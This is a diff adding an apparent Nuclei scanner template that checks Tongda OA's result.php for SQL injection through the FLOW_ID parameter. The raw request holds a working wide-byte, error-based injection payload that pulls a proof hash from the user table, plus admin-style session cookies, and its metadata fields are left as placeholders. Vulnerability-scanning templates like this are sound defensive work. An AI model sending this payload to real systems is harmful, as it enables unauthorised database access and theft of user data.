@@ -1,0 +1,26 @@
+id: tongda-FLOWID-sqli
+info:
+  name: tongda-FLOWID-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%20md5%281%29%20from%20user%20limit%201%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: PHPSESSID=5c69ce55fd8e8aba091b846170af39d0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3bf14bb4; UI_COOKIE=0
+        Upgrade-Insecure-Requests: 1
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849b
